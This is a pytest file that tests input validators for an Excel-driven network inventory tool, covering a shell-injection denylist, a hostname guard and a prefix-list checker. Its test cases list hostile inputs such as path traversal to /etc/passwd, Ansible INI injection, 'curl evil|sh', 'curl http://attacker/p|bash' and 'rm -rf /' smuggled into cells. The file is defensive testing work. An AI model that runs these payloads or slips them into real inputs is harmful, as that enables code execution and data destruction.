# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: MIT
"""
Excel-injection input-layer defenses (findings #16-key, #10, #7-validator):

  * #16 — `site_name` is in SHELL_INJECTION_PRONE_KEYS so the validator rejects
          shell metacharacters in the banner-substituted value.
  * #10 — excel_parser.assert_valid_inv_hostname() rejects path-traversal /
          INI-injection node names (hard gate, independent of validate_excel).
  * #7  — validate_excel.validate_prefix_lists() rejects malicious
          pl.id / rule.id / match cells.
"""
import importlib.util
import sys
from pathlib import Path

import openpyxl
import pytest

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(SCRIPTS))


def _load(modname, filename):
    spec = importlib.util.spec_from_file_location(modname, SCRIPTS / filename)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


ve = _load("validate_excel_mod", "validate_excel.py")
import excel_parser  # noqa: E402


# ── #16: site_name in the shell-injection denylist ────────────────────────

def test_site_name_in_shell_injection_keys():
    assert "site_name" in ve.SHELL_INJECTION_PRONE_KEYS


# ── #10: in-parser hostname guard ─────────────────────────────────────────

@pytest.mark.parametrize("good", ["core-01", "gpu-01", "su-01-node-01",
                                  "external-conn", "oob-server-01", "k8s-03"])
def test_inv_hostname_accepts_valid(good):
    assert excel_parser.assert_valid_inv_hostname(good) == good


@pytest.mark.parametrize("bad", [
    "../../../etc/passwd",
    "../foo",
    "leaf01\n[all:vars]\nansible_python_interpreter=/tmp/x.sh",
    "a/b",
    "-leadinghyphen",
    "name with space",
    "x; curl evil|sh",
    "",
])
def test_inv_hostname_rejects_malicious(bad):
    with pytest.raises(SystemExit):
        excel_parser.assert_valid_inv_hostname(bad)


# ── #7: Prefix lists validator ────────────────────────────────────────────

def _prefix_sheet(rows):
    """rows = list of (list_name, rule_id, match[, max_len]); returns a ws."""
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Prefix lists"
    ws.cell(row=1, column=1, value="List name")
    ws.cell(row=1, column=2, value="Rule id")
    ws.cell(row=1, column=3, value="Match")
    for i, r in enumerate(rows, start=2):
        for j, v in enumerate(r, start=1):
            ws.cell(row=i, column=j, value=v)
    return ws


def test_prefix_lists_accepts_valid():
    ws = _prefix_sheet([("ALLOW-DEFAULT", 10, "0.0.0.0/0"),
                        ("RFC1918", 20, "10.0.0.0/8 le 32")])
    res = ve.ValidationResult()
    ve.validate_prefix_lists(ws, res)
    assert not res.errors, res.errors


@pytest.mark.parametrize("bad_row", [
    ("PL1", 10, "0.0.0.0/0; curl http://attacker/p|bash #"),  # injection in match
    ("PL`whoami`", 10, "10.0.0.0/8"),                          # injection in name
    ("PL 1", 10, "10.0.0.0/8"),                                # space in name
    ("PL1", "10; rm -rf /", "10.0.0.0/8"),                     # injection in rule id
    ("PL1", 10, "$(curl evil)"),                               # not a CIDR
])
def test_prefix_lists_rejects_malicious(bad_row):
    ws = _prefix_sheet([bad_row])
    res = ve.ValidationResult()
    ve.validate_prefix_lists(ws, res)
    assert res.errors, f"expected rejection for {bad_row}"
